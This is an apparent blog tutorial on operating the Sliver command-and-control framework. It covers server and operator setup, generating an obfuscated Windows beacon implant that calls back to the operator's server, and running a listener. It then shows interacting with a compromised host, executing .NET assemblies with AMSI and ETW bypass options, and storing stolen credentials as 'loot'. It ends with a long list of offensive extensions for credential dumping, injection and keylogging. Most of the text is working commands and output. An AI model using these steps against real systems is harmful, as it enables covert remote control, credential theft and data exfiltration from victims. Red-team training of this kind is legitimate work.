---
title: "Sliver C2 Manual: Complete Red Team Operation"
published: 2025-09-20
description: 'Guide to C2 Operations'
image: './sliverc2room.png'
tags: [C2, RedTeamer, Command and Control]
category: 'RedTeam'
draft: false 
lang: 'en'
---

# Introduction
A Command and Control (C2) framework is a centralized platform that allows an attacker (or security professional) to remotely control and communicate with compromised devices (called "bots" or "beacons") over a network.

Think of it as the mission control center for a cyber operation. Just as NASA sends commands to and receives data from a rover on Mars, an attacker uses a C2 server to send instructions to and exfiltrate data from infected computers.

it goes without saying, that this technology is a Post Explatation Tool, meaning, it is only useful after you have successfully compromised a system by other means first, then implemented your C2 framework to Maintain Persistent Access: Remain inside a victim's network for long periods without being detected; Execute Commands: Run scripts, steal files, hijack webcams, or encrypt data for ransomware; Move Laterally: Pivot from one infected machine to others within the network; Exfiltrate Data: Steal sensitive information like passwords, intellectual property, or financial data; Download Additional Malware: Use the initial breach to deploy other malicious tools. 

So a C2 framework does not get you the foothold, you have to hack your way into the foothold first :)

as the title says, we chose Sliver by BishopFox as our Command and Control Framework of choice as it is not only open-source (my main reason) but also no GUI :) just the terminal (looking like hollywood movies;))

# Setting up
First, we spin up a Linux server, any Linux distribution will work fine, additionally, the server will just server as a proxy to compromised machines and data storage.
We must use the binary for the server especially, available on BishopFox github: https://github.com/BishopFox/sliver/releases, downlaod the sliver-server_linux. make it an executable and run it.


```bash
chmod +x sliver-server_linux 
./sliver-server_linux

output:
Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.Unpacking assets ...
[*] Loaded 21 aliases from disk
[*] Loaded 141 extension(s) from disk         
         ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
                  ░      ░  ░ ░        ░     ░  ░   ░All hackers gain dash
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options[*] Check for updates with the 'update' command[server] sliver >
```

It is important that we use the server binary, so we can create different operators later. Should your terminal not show [server] sliver or not say server in the banner as seen above, then you got the wrong binary. it will still work, but you will not have the multiplayer mode feature.

we go ahead and enter multiplayer in the sliver server terminal

```bash
[server] sliver > multiplayer

output:
[*] Multiplayer mode enabled!
```

Now we create an operator, then share the cfg file to the corresponding person.
```bash
[server] sliver >  new-operator -l <myIp> -n maine
```


Tip: Feel free to consult the help menu of every commands, with help <command> or <command> — help

From the operator terminal, repeat the step for setting up sliver-server_linux , for Sliver-client this time, alternatively in kali linux, we can just type sliver-client in our terminal and enter “y” for yes. This will install the client from the apt package manager.

To connect to the Sliver C2 server, we enter the following commands:

```bash
sliver-client import maine.cfg 
OR
./sliver-client import maine.cfg 
OR
sliver import maine.cfg
```

Tip: Feel free to consult the help menu with sliver-client -h or sliver -h

so I did the following:
```bash
$ sliver-client import maine.cfg 
2025/01/03 21:40:35 Saved new client config to: /home/maine/.sliver-client/configs/maine.cfg
```

we now, can enter again the command: sliver or sliver-client or ./sliver-client. Select the correct username for the correct IP, and hit enter
```bash
.------..------..------..------..------..------.                                                                                                                                                                                            
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |                                                                                                                                                                                            
| :/\\: || :/\\: || (\\/) || :(): || (\\/) || :(): |                                                                                                                                                                                            
| :\\/: || (__) || :\\/: || ()() || :\\/: || ()() |                                                                                                                                                                                            
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|                                                                                                                                                                                            
`------'`------'`------'`------'`------'`------'                                                                                                                                                                                            
                                                                                                                                                                                                                                            
All hackers gain reinforce
[*] Server v1.5.42 - kali
[*] Client v1.5.42 - 85b0e870d05ec47184958dbcb<SNIP>f
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command
sliver >
```

# Your First Beacon
The Server set up is done. We are given a windows 10 as a target. We disable all anti-virus and tampering on the target machine for now for demostration purposes. Let’s generate a quick implant and send it over to the target.
Using the help with the generate command, we are given the help menu along with some examples we can try.

```bash
++ Command and Control ++
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
        generate --mtls foo.example.com 

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys, 
then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
        generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888

You can also stack the C2 configuration with multiple protocols:
        generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


++ Formats ++
Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
        generate --mtls foo.example.com 
        generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
        generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
        generate --os mac --mtls foo.example.com 

To output a Linux ELF executable file, the following command would be used:
        generate --os linux --mtls foo.example.com 


++ DNS Canaries ++
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
and which implant file was discovered along with any affected sessions.

Important: You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated 
canaries and their status using the "canaries" command:
        generate --mtls foo.example.com --canary 1.foobar.com

++ Execution Limits ++
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

++ Profiles ++
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.

Sub Commands:
=============
  beacon  Generate a beacon binary
  info    Get information about the server's compiler
  stager  Generate a stager using Metasploit (requires local Metasploit installation)
```

From the help menu we see that the generate command has three other subcommands, giving us the option to generate a stager or a beacon. now, beaware that if we do not specify the subcommand,either beacon or stager, the payload generated will spawn session type interactive shells instead of beacon type shell, indeed, that option is available though I rather do a beacon to be more stealthier.
Inspired from the help menu examples, run the following to generate a windows beacon

```bash
sliver > generate beacon --mtls <mypublicip>:<PORT> --os windows --arch amd64 --format exe --seconds 5 --jitter 3

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 26s
[*] Implant saved to /home/maine/Downloads/RICH_BRUSH.exe
```

where:

    — seconds: beacon interval seconds (default: 60)
    — jitter: beacon interval jitter in seconds (default: 30)
    — mtls: mutual TLS

we start a listener:
```bash
sliver > mtls -l <PORT>

[*] Starting mTLS listener ...[*] Successfully started job #2

[*] Beacon c46b2b6e RICH_BRUSH - IP:PORT (DESKTOP-DUQ8TTD) - windows/amd64 - Fri, 03 Jan 2025 22:05:16 SAST
```

Assume we tranfered the payload and ran it on the target's execute, we got an Beacon working !!!! we now have access over the target's computer remotely over the internet. We can list our beacons by entering beacons

```bash
sliver > beacons

ID Name <SNIP>      Hostname         Username   Operating System <SNIP> c46b2b6e RICH_BRUSH  DESKTOP-DUQ8TTD   me         windows/amd64  <SNIP>sliver >
```

we can interact with a shell by entering "use" and then hit enter, you will be prompted with a list of your sessions and beacons, select the correct beacon, and hit enter again. alternatavely, we can use the shell ID to connect as follow

```bash
sliver > use c46b2b6e

[*] Active beacon RICH_BRUSH (c46b2b6e-f408-4829-8899-64472c646b57)sliver (RICH_BRUSH) >
sliver (RICH_BRUSH) > info

Beacon ID: c46b2b6e-f408-4829-8899-64472c646b57
              Name: RICH_BRUSH
          Hostname: DESKTOP-DUQ8TTD
              UUID: 52384d56-7437-0384-131a-4e4d1ede2a45
          Username: DESKTOP-DUQ8TTD\\me
               UID: S-1-5-21-2574036656-4060413577-2053307646-1001
               GID: S-1-5-21-2574036656-4060413577-2053307646-513
               PID: 1332
                OS: windows
           Version: 10 build 19045 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://<displays server public ip>:4040
    Remote Address: <displays public ip>:25685
         Proxy URL: 
          Interval: 5s
            Jitter: 3s
     First Contact: Fri Jan  3 22:05:38 SAST 2025 (27m1s ago)
      Last Checkin: Fri Jan  3 22:08:50 SAST 2025 (23m49s ago)
      Next Checkin: Fri Jan  3 22:08:55 SAST 2025 (23m44s ago)
```

We proceded to run the info command to get some basic information of the compromised endpoint, however, we notice that the entered command do take a while before getting an output, this behaviour is normal, it is because we are on beacon mode, it supposed to help to be stealthy. 
To move from beacon made to live session, where we do not have any delay, we enter the command interactive and hit enter (bad for OPSEC, higher risk to get caught)

```bash
sliver (RICH_BRUSH) > interactive

[*] Using beacon's active C2 endpoint: mtls://SNIP:4040
[*] Tasked beacon RICH_BRUSH (75f51ba0)[*] Session 1f07c18c RICH_BRUSH - SNIP:30780 (DESKTOP-DUQ8TTD) - windows/amd64 - Fri, 03 Jan 2025 22:46:36 SASTsliver (RICH_BRUSH) > background[*] Background ...
```

a session has been created, now we check sessions as follow:

```bash
sliver > sessions

ID                Name       Hostname         Username   Operating System 
<SNIP>1f07c18c    RICH_BRUSH ESKTOP-DUQ8TTD   me         windows/amd64  <SNIP>
```

We interact with the session just like what we did with the beacon, enter the command, use <session ID>, we notice right away that RICH_BRUSH or your session/beacon name turned red, indicating us that we are in sessions mode. now we have a live shell, instant output response… enter close to end the session

```bash
sliver > use 1f07c18c
[*] Active session RICH_BRUSH (1f07c18c-aa49-42a6-9d8c-3a57050493eb)sliver (RICH_BRUSH) >

sliver (RICH_BRUSH) > close
[!] Lost session 1f07c18c RICH_BRUSH -  (DESKTOP-DUQ8TTD) - windows/amd64 - Fri, 03 Jan 2025 22:51:23 SAST[!] Active session disconnected
```

Do not worry, we close the session, not the beacon :)

now, we are on the system, before we can go into enumeration or stituation awaressness, there are few simple helpful commands to know.

one of the feature is that we can upload or download files from our endpoint to the target and vice-versa, now this is quite useful for your file transfer activities, no need to spwn a server and download it from there or again download something from the web directly to the target and leaving more tracing to be detected.

To upload or download, the syntax is simple as upload [local src] <remote dst>
we can check the help menu as follow,

```bash
sliver (http-session) > help upload

Command: upload [local src] <remote dst>
About: Upload a file to the remote system.

Usage:
======
  upload [flags] local-path [remote-path]

Args:
=====
  local-path   string    local path to the file to upload
  remote-path  string    path to the file or directory to upload to

Flags:
======
  -h, --help           display help
  -i, --ioc            track uploaded file as an ioc
  -t, --timeout int    command timeout in seconds (default: 60)
```

For the interesting part, we can actually run a payload on the target without, uploading it using the execute-assembly command

```bash
sliver (http-session) > help execute-assembly 

Command: execute-assembly [local path to assembly] [arguments]
About: (Windows Only) Executes the .NET assembly in a child process.


Usage:
======
  execute-assembly [flags] filepath [arguments...]

Args:
=====
  filepath   string         path the assembly file
  arguments  string list    arguments to pass to the assembly entrypoint (default: [])

Flags:
======
  -M, --amsi-bypass                 Bypass AMSI on Windows (only supported when used with --in-process)
  -d, --app-domain        string    AppDomain name to create for .NET assembly. Generated randomly if not set.
  -a, --arch              string    Assembly target architecture: x86, x64, x84 (x86+x64) (default: x84)
  -c, --class             string    Optional class name (required for .NET DLL)
  -E, --etw-bypass                  Bypass ETW on Windows (only supported when used with --in-process)
  -h, --help                        display help
  -i, --in-process                  Run in the current sliver process
  -X, --loot                        save output as loot
  -m, --method            string    Optional method (a method is required for a .NET DLL)
  -n, --name              string    name to assign loot (optional)
  -P, --ppid              uint      parent process id (optional) (default: 0)
  -p, --process           string    hosting process to inject into (default: notepad.exe)
  -A, --process-arguments string    arguments to pass to the hosting process
  -r, --runtime           string    Runtime to use for running the assembly (only supported when used with --in-process)
  -s, --save                        save output to file
  -t, --timeout           int       command timeout in seconds (default: 60)
```

There is however, a stealthier way, it seems using the command execute-assembly spawns a child process for it to run… we can then use inline-execute-assembly, using the same syntax as above as execute-assembly command, allows us to run the command within the current process rather than creating a new one. pretty cool :) cause imagine you migrated into another trusted process like explorer ! see the vision ? :)

You may have notice the loot feature while going over other command, indeed, we can store data or credentials  in sliver via another command  by adding --loot along the command we are using, for exmape, cat creds.txt --loot, that will not only read the file but also, store it in your loot.
we could also add loot manually, let's check the loot help 

```bash
sliver > help loot

Command: loot
About: Store and share loot between operators.

A piece of loot is a file, that can be one of two loot types: text or binary. 

Sliver will attempt to detect the type of file automatically or you can specify a file type with 
--file-type. You can add local files as loot using the "local" sub-command, or you can add files
from a session using the "remote" sub-command.

Examples:

# Adding a local file (file paths are relative):
loot local ./foo.txt

# Adding a remote file from the active session:
loot remote C:/foo.txt

# Display the contents of a piece of loot:
loot fetch

Usage:
   loot [flags]
   loot [command]

Available Commands:
  fetch       Fetch a piece of loot from the server's loot store
  local       Add a local file to the server's loot store
  remote      Add a remote file from the current session to the server's loot store
  rename      Re-name a piece of existing loot
  rm          Remove a piece of loot from the server's loot store

Flags:
  -f, --filter string   filter based on loot type
  -h, --help            help for loot
  -t, --timeout int     grpc timeout in seconds (default 60)

Use " loot [command] --help" for more information about a command.
```

The loot option is kinda self-explanatory, and quite useful to have a "secure way" to store sensitive information instead of your notepad :)


# Enumeration

Now, remember that, this tool does not hack for you, it is merely an aid to your existing expertise, so I would assume that we know how to PrivEsc a system and so and so, however, Sliver make our job a bit easier and faster in a sense. To futher our enumeration on a compromised system we can leverage built-in command instead of bringing our own tool for each case( eg: adcs, kerberosting) everytime. Sliver has what is called BOF extensions, Beacon Object File extensions, those can be accessed from armory, the "BOF manager" I guess.
IMPORTANT: BOF Extensions are installed per-sliver client, they are not stored on the server. Thus extensions are not shared across operators, each operator must install the extension to use it.

let's check the list of available BOFs

```bash
sliver > armory list

Reading armory index ... done!
[!] https://github.com/sliverarmory/CS-Situational-Awareness-BOF - failed to parse trusted manifest in pkg signature: missing `help` field in extension manifest

 Packages                                                                                                                                                                                                
 Armory    Command Name                    Version   Type        Help                                                                                                                                    
========= =============================== ========= =========== =========================================================================================================================================
 Default   bof-roast                       v0.0.2    Extension   Beacon Object File repo for roasting Active Directory                                                                                   
 Default   bof-servicemove                 v0.0.1    Extension   Lateral movement technique by abusing Windows Perception Simulation Service to achieve DLL hijacking                                    
 Default   c2tc-addmachineaccount          v0.0.9    Extension   AddMachineAccount [Computername] [Password <Optional>]                                                                                  
 Default   c2tc-askcreds                   v0.0.9    Extension   Collect passwords using CredUIPromptForWindowsCredentialsName                                                                           
 Default   c2tc-domaininfo                 v0.0.9    Extension   enumerate domain information using Active Directory Domain Services                                                                     
 Default   c2tc-kerberoast                 v0.0.9    Extension   A BOF tool to list all SPN enabled user/service accounts or request service tickets (TGS-REP)                                           
 Default   c2tc-kerbhash                   v0.0.9    Extension   port of the Mimikatz/Rubeus hash command                                                                                                
 Default   c2tc-klist                      v0.0.9    Extension   Displays a list of currently cached Kerberos tickets.                                                                                   
 Default   c2tc-lapsdump                   v0.0.9    Extension   Dump LAPS passwords from specified computers within Active Directory                                                                    
 Default   c2tc-petitpotam                 v0.0.9    Extension   PetitPotam <capture server ip or hostname> <target server ip or hostname>                                                               
 Default   c2tc-psc                        v0.0.9    Extension   show detailed information from processes with established TCP and RDP connections                                                       
 Default   c2tc-psk                        v0.0.9    Extension   show detailed information from the windows kernel and loaded driver modules                                                             
 Default   c2tc-psm                        v0.0.9    Extension   show detailed information from a specific process id                                                                                    
 Default   c2tc-psw                        v0.0.9    Extension   Show Window titles from processes with active Windows                                                                                   
 Default   c2tc-psx                        v0.0.9    Extension   show (detailed) information from all processes running on the system                                                                    
 Default   c2tc-smbinfo                    v0.0.9    Extension   Gather remote system version info using the NetWkstaGetInfo API                                                                         
 Default   c2tc-spray-ad                   v0.0.9    Extension   Perform a Kerberos or ldap password spraying attack against Active Directory                                                            
 Default   c2tc-startwebclient             v0.0.9    Extension   Starting WebClient Service Programmatically                                                                                             
 Default   c2tc-wdtoggle                   v0.0.9    Extension   Patch lsass to enable WDigest credential caching                                                                                        
 Default   c2tc-winver                     v0.0.9    Extension   Display the version of Windows that is running, the build number and patch release (Update Build Revision)                              
 Default   certify                         v0.0.4    Alias       Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services                                  
 Default   chisel                          v0.0.1    Extension   Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH                                                                 
 Default   chromiumkeydump                 v0.0.2    Extension   Dump Chrome/Edge Masterkey                                                                                                              
 Default   coff-loader                     v1.0.15   Extension   Load and execute Beacon Object Files (BOFs) in memory.                                                                                  
 Default   credman                         v1.0.7    Extension   Dump credentials using the CredsBackupCredentials API                                                                                   
 Default   delegationbof                   v0.0.2    Extension   LDAP checks for RBCD, Constrained, Constrained w/Protocol Transition, Unconstrained Delegation, ASREP, and Kerberoastable SPNs          
 Default   find-module                     v0.0.2    Extension   Uses direct system calls to enumerate processes for specific modules                                                                    
 Default   find-proc-handle                v0.0.2    Extension   Uses direct system calls to enumerate processes for specific process handles                                                            
 Default   go-cookie-monster               v0.0.1    Extension   Chrome cookie stealer with AppBound key support                                                                                         
 Default   handlekatz                      v0.0.1    Extension   Implementation of handlekatz as a BOF (x64 only)                                                                                        
 Default   hashdump                        v1.0.0    Extension   Dump local SAM password hashes                                                                                                          
 Default   hollow                          v0.0.1    Extension   EarlyBird process hollowing technique                                                                                                   
 Default   inject-amsi-bypass              v0.0.2    Extension   Beacon Object File (BOF) that bypasses AMSI in a remote process with code injection.                                                    
 Default   inject-clipboard                v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-conhost                  v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-createremotethread       v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-ctray                    v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-dde                      v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-etw-bypass               v0.0.3    Extension   Inject ETW Bypass into Remote Process via Syscalls (HellsGate|HalosGate)                                                                
 Default   inject-kernelcallbacktable      v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-ntcreatethread           v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-ntqueueapcthread         v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-setthreadcontext         v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-svcctrl                  v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-tooltip                  v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inject-uxsubclassinfo           v0.1.2    Extension   inject into a process                                                                                                                   
 Default   inline-execute-assembly         v0.0.1    Extension   in process .NET assembly execution                                                                                                      
 Default   jump-psexec                     v0.0.2    Extension   psexec lateral movement module                                                                                                          
 Default   jump-wmiexec                    v0.0.2    Extension   wmiexec lateral movement module                                                                                                         
 Default   kerbrute                        v0.0.1    Extension   A tool to perform Kerberos pre-auth bruteforcing                                                                                        
 Default   krbrelayup                      v0.0.2    Alias       A universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings). 
 Default   ldapsigncheck                   v0.0.1    Extension   check LDAP signing                                                                                                                      
 Default   mimikatz                        v0.0.1    Extension   A little tool to play with Windows security                                                                                             
 Default   mlokit                          v0.0.1    Alias       MLOps Attack Toolkit                                                                                                                    
 Default   nanodump                        v0.0.5    Extension   A Beacon Object File that creates a minidump of the LSASS process.                                                                      
 Default   nanorobeus                      v0.0.2    Extension   Beacon Object File for managing Kerberos tickets                                                                                        
 Default   nps                             v0.0.2    Alias       PowerShell rebuilt in C# for Red Teaming purposes                                                                                       
 Default   patchit                         v0.0.1    Extension   patch, check and revert AMSI and ETW for x64 process                                                                                    
 Default   portbender                      v0.0.1    Extension   TCP Port Redirection Utility                                                                                                            
 Default   raw-keylogger                   v0.0.7    Extension   Logs keystrokes using the raw input interface                                                                                           
 Default   remote-adcs-request             v0.1.2    Extension   Request an certificate from an AD certificate server                                                                                    
 Default   remote-adcs_request_on_behalf   v0.1.2    Extension   Requests an enrollment certificate on behalf of another user                                                                            
 Default   remote-adduser                  v0.1.2    Extension   Add a new user to a machine                                                                                                             
 Default   remote-addusertogroup           v0.1.2    Extension   Add the specified user to the domain group                                                                                              
 Default   remote-chrome-key               v0.1.2    Extension   Get Decryption key usable with Chlonium (https://github.com/rxwx/chlonium)                                                              
 Default   remote-enable-user              v0.1.2    Extension   Unlock and enable a local / remote user account                                                                                         
 Default   remote-get_priv                 v0.1.2    Extension   Activate the specified token privledge, more for non-cobalt strike users                                                                
 Default   remote-ghost_task               v0.1.2    Extension   direct registry manipulation to create scheduled tasks without triggering the usual event logs                                          
 Default   remote-global_unprotect         v0.1.2    Extension   Attempts to find, decrypt, and download Global Protect VPN profiles and HIP settings                                                    
 Default   remote-lastpass                 v0.1.2    Extension   Searches memory for LastPass passwords and hashes                                                                                       
 Default   remote-make_token_cert          v0.1.2    Extension   Applies an impersonation token based on the Alt Name in a supplied .pfx file                                                            
 Default   remote-office-tokens            v0.1.2    Extension   Searches memory for Office JWT Access Tokens                                                                                            
 Default   remote-procdump                 v0.1.2    Extension   Dumps the specified process to the specified output file                                                                                
 Default   remote-process-destroy          v0.1.2    Extension   Attempt to crash a local process by cutting all handles in it.                                                                          
 Default   remote-process-list-handles     v0.1.2    Extension   list the various handles a process has open                                                                                             
 Default   remote-reg-delete               v0.1.2    Extension   Delete a registry key or value                                                                                                          
 Default   remote-reg-save                 v0.1.2    Extension   backup a registry have to a file on disk (requires Enabled SEBackup Priv)                                                               
 Default   remote-reg-set                  v0.1.2    Extension   Dumps the specified process to the specified output file                                                                                
 Default   remote-sc-config                v0.1.2    Extension   configure an existing service                                                                                                           
 Default   remote-sc-create                v0.1.2    Extension   Create a new service on a windows system                                                                                                
 Default   remote-sc-delete                v0.1.2    Extension   delete a service from a windows based computer                                                                                          
 Default   remote-sc-description           v0.1.2    Extension   change description of a server                                                                                                          
 Default   remote-sc-start                 v0.1.2    Extension   Start service on a windows based system                                                                                                 
 Default   remote-sc-stop                  v0.1.2    Extension   stop service on a windows based system                                                                                                  
 Default   remote-sc_failure               v0.1.2    Extension   sc_failure                                                                                                                              
 Default   remote-schtasks-delete          v0.1.2    Extension   Delete a scheduled task                                                                                                                 
 Default   remote-schtasks-stop            v0.1.2    Extension   stop a running scheduled task                                                                                                           
 Default   remote-schtaskscreate           v0.1.2    Extension   Unlock and enable a local / remote user account                                                                                         
 Default   remote-schtasksrun              v0.1.2    Extension   run a scheduled task                                                                                                                    
 Default   remote-setuserpass              v0.1.2    Extension   set the password for a given user account                                                                                               
 Default   remote-shspawnas                v0.1.2    Extension   spawn / inject as specified user                                                                                                        
 Default   remote-slackKey                 v0.1.2    Extension   Decrypts the provided base64 encoded Chrome key                                                                                         
 Default   remote-slack_cookie             v0.1.2    Extension   Collect the Slack authentication cookie from a Slack process                                                                            
 Default   remote-suspendresume            v0.1.2    Extension   uspend a process by pid                                                                                                                 
 Default   remote-unexpireuser             v0.1.2    Extension   Enables and unlocks the specified user account                                                                                          
 Default   rubeus                          v0.0.25   Alias       Rubeus is a C# tool set for raw Kerberos interaction and abuses.                                                                        
 Default   sa-adcs-enum                    v0.0.23   Extension   Enumerates CAs and templates in the AD using Win32 functions                                                                            
 Default   sa-adcs-enum-com                v0.0.23   Extension   Enumerates CAs and templates in the AD using ICertConfig COM object                                                                     
 Default   sa-adcs-enum-com2               v0.0.23   Extension   Enumerates CAs and templates in the AD using IX509PolicyServerListManager COM object                                                    
 Default   sa-adv-audit-policies           v0.0.23   Extension   Retrieves advanced security audit policies                                                                                              
 Default   sa-arp                          v0.0.23   Extension   Lists ARP table                                                                                                                         
 Default   sa-cacls                        v0.0.23   Extension   Lists user permissions for the specified file, wildcards supported                                                                      
 Default   sa-dir                          v0.0.23   Extension   Lists a target directory using BOF.                                                                                                     
 Default   sa-driversigs                   v0.0.23   Extension   Enumerate installed services Image paths                                                                                                
 Default   sa-enum-filter-driver           v0.0.23   Extension   Enumerates all the filter drivers                                                                                                       
 Default   sa-enum-local-sessions          v0.0.23   Extension   Enumerate the currently attached user sessions both local and over rdp                                                                  
 Default   sa-env                          v0.0.23   Extension   List process environment variables                                                                                                      
 Default   sa-find-loaded-module           v0.0.23   Extension   Finds what processes *modulepart* is loaded into, optionally searching just *procnamepart*                                              
 Default   sa-get-netsession               v0.0.23   Extension   Enumerates all sessions on the specified computer or the local one                                                                      
 Default   sa-get-netsession2              v0.0.23   Extension   Modified version of netsession that supports BOFHound                                                                                   
 Default   sa-get-password-policy          v0.0.23   Extension   Gets target server or domain's configured password policy and lockouts                                                                  
 Default   sa-ipconfig                     v0.0.23   Extension   Simply gets ipv4 addresses, hostname and dns server                                                                                     
 Default   sa-ldapsearch                   v0.0.23   Extension   Execute LDAP searches (non paged)                                                                                                       
 Default   sa-list_firewall_rules          v0.0.23   Extension   List Windows firewall rules                                                                                                             
 Default   sa-listdns                      v0.0.23   Extension   Pulls dns cache entries, attempts to query and resolve each                                                                             
 Default   sa-listmods                     v0.0.23   Extension   List a process' modules (DLL)                                                                                                           
 Default   sa-locale                       v0.0.23   Extension   List system locale language, locale ID, date, time, and country                                                                         
 Default   sa-netgroup                     v0.0.23   Extension   Lists Groups from the default (or specified) domain                                                                                     
 Default   sa-netlocalgroup                v0.0.23   Extension   List local groups from the local (or specified) computer                                                                                
 Default   sa-netlocalgroup2               v0.0.23   Extension   List server group members                                                                                                               
 Default   sa-netloggedon                  v0.0.23   Extension   Return users logged on the local or remote computer                                                                                     
 Default   sa-netloggedon2                 v0.0.23   Extension   Modified version of netloggedon that supports BOFHound                                                                                  
 Default   sa-netshares                    v0.0.23   Extension   List shares on local or remote computer                                                                                                 
 Default   sa-netstat                      v0.0.23   Extension   TCP / UDP IPv4 netstat listing                                                                                                          
 Default   sa-nettime                      v0.0.23   Extension   Display time on remote computer                                                                                                         
 Default   sa-netuptime                    v0.0.23   Extension   Return information about the boot time on the local or remote computer                                                                  
 Default   sa-netuser                      v0.0.23   Extension   Pulls info about specific user.                                                                                                         
 Default   sa-netuserenum                  v0.0.23   Extension   Net user enumeration                                                                                                                    
 Default   sa-netview                      v0.0.23   Extension   Net view                                                                                                                                
 Default   sa-notepad                      v0.0.23   Extension   Search for open notepad and notepad++ windows and grab text from the editor control object                                              
 Default   sa-nslookup                     v0.0.23   Extension   Makes a dns query. NOTE: Some situations are limited due to observed crashes                                                            
 Default   sa-probe                        v0.0.23   Extension   Check if a specific port is open                                                                                                        
 Default   sa-reg-query                    v0.0.23   Extension   Query the Windows registry                                                                                                              
 Default   sa-regsession                   v0.0.23   Extension   Return logged on user SIDs by enumerating HKEY_USERS                                                                                    
 Default   sa-routeprint                   v0.0.23   Extension   Prints IPv4 configured routes                                                                                                           
 Default   sa-sc-enum                      v0.0.23   Extension   Enumerate Windows services                                                                                                              
 Default   sa-sc-qc                        v0.0.23   Extension   Queries the configuration information for a specified service.                                                                          
 Default   sa-sc-qdescription              v0.0.23   Extension   sc qdescription implementation in bof                                                                                                   
 Default   sa-sc-qfailure                  v0.0.23   Extension   sc qfailure implementation in bof                                                                                                       
 Default   sa-sc-qtriggerinfo              v0.0.23   Extension   Queries a service for trigger conditions.                                                                                               
 Default   sa-sc-query                     v0.0.23   Extension   sc query implementation in bof                                                                                                          
 Default   sa-schtasksenum                 v0.0.23   Extension   Enumerates all scheduled tasks on the local or if provided remote machine                                                               
 Default   sa-schtasksquery                v0.0.23   Extension   Queries the given task from the local or if provided remote machine                                                                     
 Default   sa-tasklist                     v0.0.23   Extension   Get a list of running processes including PID, PPID and CommandLine (uses wmi)                                                          
 Default   sa-uptime                       v0.0.23   Extension   Prints system boot time and how long it's been since then                                                                               
 Default   sa-vssenum                      v0.0.23   Extension   Enumerates shadow copies on some server 2012+ machines                                                                                  
 Default   sa-whoami                       v0.0.23   Extension   Simulates whoami /all                                                                                                                   
 Default   sa-windowlist                   v0.0.23   Extension   Lists visible windows in the current users session                                                                                      
 Default   sa-wmi-query                    v0.0.23   Extension   Run a wmi query and display results in CSV format                                                                                       
 Default   scshell                         v0.0.2    Extension   Fileless lateral movement                                                                                                               
 Default   seatbelt                        v0.0.6    Alias       Seatbelt is a C# project that performs a number of security oriented host-survey 'safety checks'                                        
 Default   secinject                       v0.0.1    Extension   Section Mapping Process Injection                                                                                                       
 Default   sharp-hound-3                   v0.0.2    Alias       C# based BloodHound Ingestor                                                                                                            
 Default   sharp-hound-4                   v0.0.2    Alias       C# based BloodHound Ingestor                                                                                                            
 Default   sharp-smbexec                   v0.0.3    Alias       A native C# conversion of the Invoke-SMBExec powershell script                                                                          
 Default   sharp-wmi                       v0.0.2    Alias       C# implementation of various WMI functionality                                                                                          
